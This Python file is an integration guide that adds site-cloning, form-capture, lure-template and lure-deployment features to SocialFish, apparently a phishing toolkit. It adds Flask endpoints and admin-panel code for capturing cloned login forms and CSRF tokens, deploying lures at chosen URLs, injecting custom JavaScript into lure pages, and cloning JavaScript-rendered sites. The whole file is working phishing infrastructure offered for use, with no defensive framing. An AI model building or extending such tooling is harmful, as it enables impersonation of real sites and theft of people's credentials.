#!/usr/bin/env python3
"""
Integration Guide for Enhanced Cloning Features into SocialFish.py
Shows exactly how to integrate the new features
"""

# ============================================================================
# STEP 1: ADD IMPORTS TO SocialFish.py
# ============================================================================

"""
Add these imports at the top of SocialFish.py after existing imports:
"""

# Existing imports (already in SocialFish.py)
# from flask import Flask, request, render_template, ...
# from core.config import *
# from core.clonesf import clone
# ... etc

# NEW IMPORTS - Add these:
from features.cloning import (
    FormDataCapture,
    FormFieldAnalyzer,
    CsrfTokenExtractor,
    FormInterceptor,
    LureManager,
    LureTemplate,
    DynamicPageCloner,
    AssetDownloader,
    CdnAssetManager
)


# ============================================================================
# STEP 2: INITIALIZE MANAGERS (After SocketIO initialization)
# ============================================================================

"""
Add this after the existing manager initializations:
"""

# Add after existing managers (around line 77 in SocialFish.py):
# Initialize cloning features
lure_manager = LureManager(database_path=DATABASE)
form_capture = FormDataCapture()
asset_downloader = AssetDownloader()
dynamic_cloner = DynamicPageCloner()


# ============================================================================
# STEP 3: ADD NEW API ENDPOINTS
# ============================================================================

"""
Add these routes before the app.run() at the end of the file
"""

# ========== FORM CAPTURE ENDPOINTS ==========

@app.route('/api/forms/capture', methods=['POST'])
@login_required
def api_capture_forms():
    """Receive and process captured form submissions"""
    data = request.get_json()
    
    try:
        clone_id = data.get('clone_id')
        html = data.get('html')
        url = data.get('url')
        
        if not all([clone_id, html, url]):
            return jsonify({'status': 'error', 'message': 'Missing required fields'}), 400
        
        # Capture forms
        forms = form_capture.capture_form_data(html, url, clone_id)
        
        # Store in database
        conn = g.db
        cursor = conn.cursor()
        
        for form in forms:
            cursor.execute('''
                INSERT INTO forms_captured 
                (clone_id, form_id, action, method, fields_json, csrf_tokens_json)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                clone_id,
                form['form_id'],
                form['action'],
                form['method'],
                json.dumps(form['fields']),
                json.dumps(form['csrf_tokens'])
            ))
        
        conn.commit()
        
        logger.info(f"[+] Captured {len(forms)} forms for clone {clone_id}")
        
        return jsonify({
            'status': 'ok',
            'forms_captured': len(forms),
            'details': forms
        })
    
    except Exception as e:
        logger.error(f"[-] Form capture error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/forms/templates', methods=['GET'])
@login_required
def api_list_form_templates():
    """List saved form templates"""
    try:
        conn = g.db
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM forms_captured GROUP BY clone_id')
        templates = cursor.fetchall()
        
        result = []
        for template in templates:
            result.append({
                'clone_id': template[1],
                'form_count': template[0],
                'captured_at': template[8]
            })
        
        return jsonify({
            'status': 'ok',
            'templates': result,
            'total': len(result)
        })
    
    except Exception as e:
        logger.error(f"[-] List templates error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/forms/analyze', methods=['POST'])
@login_required
def api_analyze_forms():
    """Analyze page for forms"""
    data = request.get_json()
    
    try:
        html = data.get('html')
        url = data.get('url')
        clone_id = data.get('clone_id', 'temp')
        
        forms = form_capture.capture_form_data(html, url, clone_id)
        
        return jsonify({
            'status': 'ok',
            'forms': forms,
            'total_forms': len(forms),
            'total_fields': sum(len(f['fields']) for f in forms)
        })
    
    except Exception as e:
        logger.error(f"[-] Form analysis error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


# ========== LURE MANAGEMENT ENDPOINTS ==========

@app.route('/api/lures/create', methods=['POST'])
@login_required
def api_create_lure():
    """Create a new lure template"""
    data = request.get_json()
    
    try:
        result = lure_manager.create_template(
            name=data.get('name'),
            url=data.get('url'),
            clone_id=data.get('clone_id'),
            description=data.get('description', ''),
            tags=data.get('tags', []),
            created_by=session.get('username', 'admin')
        )
        
        if result['status'] == 'ok':
            template_id = result['template_id']
            
            # Save form configuration if provided
            if 'forms' in data:
                lure_manager.save_forms_config(template_id, data['forms'])
            
            logger.info(f"[+] Lure created: {template_id}")
        
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"[-] Lure creation error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/lures/list', methods=['GET'])
@login_required
def api_list_lures():
    """List all lure templates"""
    try:
        tags = request.args.getlist('tags')
        templates = lure_manager.list_templates(tags if tags else None)
        
        return jsonify({
            'status': 'ok',
            'templates': templates,
            'total': len(templates)
        })
    
    except Exception as e:
        logger.error(f"[-] List lures error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/lures/<template_id>', methods=['GET'])
@login_required
def api_get_lure(template_id):
    """Get lure template details"""
    try:
        template = lure_manager.get_template(template_id)
        
        if not template:
            return jsonify({'status': 'error', 'message': 'Template not found'}), 404
        
        return jsonify({
            'status': 'ok',
            'template': template
        })
    
    except Exception as e:
        logger.error(f"[-] Get lure error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/lures/<template_id>/deploy', methods=['POST'])
@login_required
def api_deploy_lure(template_id):
    """Deploy a lure template"""
    data = request.get_json()
    
    try:
        deployment = lure_manager.create_deployment(
            template_id=template_id,
            deployed_url=data.get('deployed_url'),
            notes=data.get('notes', '')
        )
        
        if deployment['status'] == 'ok':
            logger.info(f"[+] Lure deployed: {deployment['deployment_id']}")
        
        return jsonify(deployment)
    
    except Exception as e:
        logger.error(f"[-] Deploy lure error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/lures/<template_id>/custom-js', methods=['POST'])
@login_required
def api_add_lure_js(template_id):
    """Add custom JavaScript to lure"""
    data = request.get_json()
    
    try:
        success = lure_manager.add_custom_js(
            template_id=template_id,
            js_code=data.get('js_code', '')
        )
        
        return jsonify({
            'status': 'ok' if success else 'error',
            'message': 'JavaScript added' if success else 'Failed to add JavaScript'
        })
    
    except Exception as e:
        logger.error(f"[-] Add custom JS error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/lures/<template_id>/custom-css', methods=['POST'])
@login_required
def api_add_lure_css(template_id):
    """Add custom CSS to lure"""
    data = request.get_json()
    
    try:
        success = lure_manager.add_custom_css(
            template_id=template_id,
            css_code=data.get('css_code', '')
        )
        
        return jsonify({
            'status': 'ok' if success else 'error',
            'message': 'CSS added' if success else 'Failed to add CSS'
        })
    
    except Exception as e:
        logger.error(f"[-] Add custom CSS error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


# ========== DYNAMIC CLONING ENDPOINTS ==========

@app.route('/api/clone/dynamic', methods=['POST'])
@login_required
def api_clone_dynamic():
    """Clone a JavaScript-rendered page"""
    data = request.get_json()
    
    try:
        import asyncio
        
        result = asyncio.run(dynamic_cloner.clone_dynamic_page(
            url=data.get('url'),
            wait_for_selector=data.get('wait_selector', 'body'),
            wait_time=int(data.get('wait_time', 5000)),
            include_assets=data.get('include_assets', True)
        ))
        
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"[-] Dynamic clone error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


# ========== ASSET MANAGEMENT ENDPOINTS ==========

@app.route('/api/assets/cdn/<library>', methods=['GET'])
@login_required
def api_get_cdn_url(library):
    """Get CDN URL for a library"""
    try:
        url = CdnAssetManager.get_cdn_url(library)
        
        if url:
            available = CdnAssetManager.verify_asset_availability(url)
            return jsonify({
                'status': 'ok',
                'library': library,
                'url': url,
                'available': available
            })
        else:
            return jsonify({
                'status': 'error',
                'message': f'No CDN URL for {library}'
            }), 404
    
    except Exception as e:
        logger.error(f"[-] Get CDN URL error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


# ============================================================================
# STEP 4: UPDATE DATABASE SCHEMA
# ============================================================================

"""
Add this to core/dbsf.py initDB() function:
"""

def init_cloning_tables(conn):
    """Initialize cloning feature tables"""
    cursor = conn.cursor()
    
    # Forms captured
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS forms_captured (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            clone_id TEXT,
            form_id TEXT,
            action TEXT,
            method TEXT,
            fields_json TEXT,
            csrf_tokens_json TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()


# ============================================================================
# STEP 5: UPDATE WEB INTERFACE (templates/admin/index.html)
# ============================================================================

"""
Add these sections to the admin panel:
"""

HTML_TEMPLATE = """
<!-- Lure Templates Section -->
<div id="lure-templates" class="tab-content">
    <h2>Lure Templates</h2>
    <button class="btn btn-primary" onclick="showCreateLureModal()">Create New Lure</button>
    
    <table id="lures-table" class="table">
        <thead>
            <tr>
                <th>Name</th>
                <th>URL</th>
                <th>Created</th>
                <th>Uses</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody id="lures-tbody"></tbody>
    </table>
</div>

<!-- Form Analysis Section -->
<div id="form-analysis" class="tab-content">
    <h2>Form Analysis</h2>
    <textarea id="html-input" placeholder="Paste HTML here..." style="height: 300px;"></textarea>
    <input type="text" id="url-input" placeholder="Enter base URL">
    <button onclick="analyzeHTML()">Analyze Forms</button>
    
    <div id="forms-result"></div>
</div>
"""


# ============================================================================
# STEP 6: ADD JAVASCRIPT HANDLERS (templates/admin/static/js/cloning.js)
# ============================================================================

"""
Create new file: templates/admin/static/js/cloning.js
"""

JAVASCRIPT_CODE = """
// Load lures
function loadLures() {
    fetch('/api/lures/list')
        .then(r => r.json())
        .then(data => {
            if (data.status === 'ok') {
                const tbody = document.getElementById('lures-tbody');
                tbody.innerHTML = '';
                
                data.templates.forEach(template => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${template.name}</td>
                        <td>${template.url}</td>
                        <td>${template.created_at}</td>
                        <td>${template.usage_count}</td>
                        <td>
                            <button onclick="deployLure('${template.template_id}')">Deploy</button>
                            <button onclick="editLure('${template.template_id}')">Edit</button>
                            <button onclick="deleteLure('${template.template_id}')">Delete</button>
                        </td>
                    `;
                    tbody.appendChild(row);
                });
            }
        });
}

// Analyze HTML for forms
function analyzeHTML() {
    const html = document.getElementById('html-input').value;
    const url = document.getElementById('url-input').value;
    
    if (!html || !url) {
        alert('Please provide both HTML and URL');
        return;
    }
    
    fetch('/api/forms/analyze', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({html, url, clone_id: 'temp'})
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'ok') {
            displayFormAnalysis(data.forms);
        } else {
            alert('Error: ' + data.message);
        }
    });
}

// Display form analysis results
function displayFormAnalysis(forms) {
    const result = document.getElementById('forms-result');
    result.innerHTML = '<h3>Found ' + forms.length + ' forms:</h3>';
    
    forms.forEach((form, i) => {
        const div = document.createElement('div');
        div.className = 'form-analysis';
        div.innerHTML = `
            <h4>Form ${i+1}: ${form.form_id}</h4>
            <p>Action: ${form.action}</p>
            <p>Method: ${form.method}</p>
            <p>Fields: ${form.fields.length}</p>
            <ul>
                ${form.fields.map(f => `<li>${f.name} (${f.category})</li>`).join('')}
            </ul>
        `;
        result.appendChild(div);
    });
}

// Deploy lure
function deployLure(templateId) {
    const url = prompt('Enter deployment URL:');
    if (url) {
        fetch(`/api/lures/${templateId}/deploy`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({deployed_url: url})
        })
        .then(r => r.json())
        .then(data => {
            alert(data.status === 'ok' ? 'Deployed!' : 'Error: ' + data.message);
            loadLures();
        });
    }
}
"""


# ============================================================================
# STEP 7: UPDATE requirements.txt
# ============================================================================

"""
Add to requirements.txt if not already present:
"""

# playwright>=1.40.0  # For dynamic page cloning
# chardet>=5.0       # For encoding detection


# ============================================================================
# IMPLEMENTATION CHECKLIST
# ============================================================================

"""
Steps to integrate:

1. [  ] Copy imports from Step 1 to SocialFish.py
2. [  ] Add manager initializations from Step 2
3. [  ] Add API endpoint routes from Step 3
4. [  ] Add database tables from Step 4
5. [  ] Update HTML templates from Step 5
6. [  ] Create JavaScript file from Step 6
7. [  ] Install new dependencies: pip install playwright
8. [  ] Test imports: python -c "from features.cloning import *"
9. [  ] Initialize database: python utilities/verify_schema.py
10. [ ] Run tests: python utilities/comprehensive_test_and_browser.py
11. [ ] Start app: python SocialFish.py admin password
12. [ ] Access: http://localhost:5000/admin/
13. [ ] Test new features in admin panel

Total time: 2-3 hours
"""

# ============================================================================
# TESTING THE INTEGRATION
# ============================================================================

"""
Quick test after integration:

# Test imports
python -c "from features.cloning import *; print('Imports OK')"

# Test feature initialization
python -c "
from features.cloning import LureManager, FormDataCapture
m = LureManager()
f = FormDataCapture()
print('Initialization OK')
"

# Test API endpoints
curl -X POST http://localhost:5000/api/lures/list

# Access admin panel
http://localhost:5000/admin/
"""

print(__doc__)
